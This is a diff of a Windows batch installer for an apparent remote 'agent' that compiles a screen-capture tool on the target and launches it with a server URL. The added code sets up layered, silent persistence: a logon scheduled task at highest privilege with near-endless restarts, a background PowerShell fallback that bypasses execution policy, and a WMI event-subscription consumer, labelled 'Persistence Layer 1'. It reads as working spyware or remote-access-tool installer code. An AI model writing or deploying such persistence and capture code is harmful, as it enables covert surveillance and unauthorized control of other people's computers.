@@ -85,19 +85,19 @@ echo [0/10] Checking system dependencies...
 :: Check if Visual C++ 2015-2022 Redistributable (x64) is installed
 reg query "HKLM\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64" /v "Version" >nul 2>&1
 if %errorlevel% neq 0 (
-    echo     [!] Visual C++ Redistributable missing. Installing silently...
-    set "VCREDIST_EXE=%TEMP%\vc_redist.x64.exe"
-    
-    :: Download silently
-    powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vc_redist.x64.exe' -OutFile '%TEMP%\vc_redist.x64.exe' -UseBasicParsing" >nul 2>&1
+    echo     [!] Visual C++ Redistributable missing. Downloading...
+    echo     [######              ] 30%%
+    :: Use bitsadmin (native Windows, never hangs like PowerShell)
+    bitsadmin /transfer "VCRedist" /priority foreground "https://aka.ms/vs/17/release/vc_redist.x64.exe" "%TEMP%\vc_redist.x64.exe" >nul 2>&1
     
     :: Install silently
     if exist "%TEMP%\vc_redist.x64.exe" (
+        echo     [############        ] 60%% - Installing...
         "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
         del /F /Q "%TEMP%\vc_redist.x64.exe" >nul 2>&1
-        echo     [*] Dependency installed successfully.
+        echo     [####################] 100%% - Dependency installed!
     ) else (
-        echo     [ERROR] Failed to download dependency. Agent may not run.
+        echo     [!] Download failed. Agent may still work without it.
     )
 ) else (
     echo     [*] Dependencies verified.
@@ -203,14 +203,25 @@ if %errorlevel% neq 0 (
 )
 echo     [########            ] 40%% - Files copied
 
-:: Force recompile ScreenCap on target machine (CPU/DPI specific)
+:: Pre-compile ScreenCap.exe on target machine if CSC available, otherwise KEEP the bundled one
 echo     [~] Configuring screen capture engine...
 if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" (
-    if exist "%INSTALL_DIR%\ScreenCap.exe" del /F /Q "%INSTALL_DIR%\ScreenCap.exe" >nul 2>&1
+    set "CSC_PATH=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 ) else if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
-    if exist "%INSTALL_DIR%\ScreenCap.exe" del /F /Q "%INSTALL_DIR%\ScreenCap.exe" >nul 2>&1
+    set "CSC_PATH=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
 ) else (
-    echo     [!] CSC.exe not found - keeping existing ScreenCap.exe
+    set "CSC_PATH="
+    echo     [*] CSC.exe not found - using bundled ScreenCap.exe
+)
+if defined CSC_PATH (
+    if exist "%INSTALL_DIR%\ScreenCap.cs" (
+        "%CSC_PATH%" /nologo /target:winexe /out:"%INSTALL_DIR%\ScreenCap.exe" /r:System.Windows.Forms.dll,System.Drawing.dll "%INSTALL_DIR%\ScreenCap.cs" >nul 2>&1
+        if %errorlevel% equ 0 (
+            echo     [*] ScreenCap compiled for this machine
+        ) else (
+            echo     [!] Compile failed - using bundled ScreenCap.exe
+        )
+    )
 )
 echo     [############        ] 60%%
 
@@ -254,13 +265,14 @@ echo     [~] Registering auto-start task...
 schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
 echo     [##########          ] 50%%
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "$a = New-ScheduledTaskAction -Execute '%INSTALL_DIR%\%BIN_NAME%' -Argument '%SERVER_URL%' -WorkingDirectory '%INSTALL_DIR%'; " ^
-  "$t2 = New-ScheduledTaskTrigger -AtLogOn; " ^
-  "$p = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Users' -RunLevel Highest; " ^
-  "$s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365) -MultipleInstances IgnoreNew; " ^
-  "Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $a -Trigger @($t2) -Settings $s -Principal $p -Force | Out-Null; " ^
-  "Write-Host '    Task registered successfully.' -ForegroundColor Green"
+:: Use schtasks.exe native command as primary (never hangs), PowerShell as background fallback
+schtasks /Create /TN "%TASK_NAME%" /TR "\"%INSTALL_DIR%\%BIN_NAME%\" %SERVER_URL%" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
+if %errorlevel% equ 0 (
+    echo     [*] Task registered via schtasks.exe
+) else (
+    echo     [!] schtasks failed, trying PowerShell in background...
+    start "" /B powershell -NoProfile -ExecutionPolicy Bypass -Command "$a = New-ScheduledTaskAction -Execute '%INSTALL_DIR%\%BIN_NAME%' -Argument '%SERVER_URL%' -WorkingDirectory '%INSTALL_DIR%'; $t2 = New-ScheduledTaskTrigger -AtLogOn; $p = New-ScheduledTaskPrincipal -GroupId 'BUILTIN\Users' -RunLevel Highest; $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 365) -MultipleInstances IgnoreNew; Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $a -Trigger @($t2) -Settings $s -Principal $p -Force | Out-Null" >nul 2>&1
+)
 echo     [####################] 100%% - Persistence Layer 1 active!
 echo.
 
@@ -293,10 +305,8 @@ echo $wql = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetIns
 echo $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name=$fn; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$wql}
 echo $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name=$cn; CommandLineTemplate='%INSTALL_DIR%\%BIN_NAME% %SERVER_URL%'; RunInteractively=$false}
 echo Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} ^| Out-Null
-echo Write-Host '    WMI subscription created.' -ForegroundColor Green
 ) > "%WMI_SCRIPT%"
-powershell -NoProfile -ExecutionPolicy Bypass -File "%WMI_SCRIPT%" 2>nul
-del /F /Q "%WMI_SCRIPT%" >nul 2>&1
+start "" /B powershell -NoProfile -ExecutionPolicy Bypass -File "%WMI_SCRIPT%" >nul 2>&1
 echo     [####################] 100%% - WMI subscription active!
 echo.
 
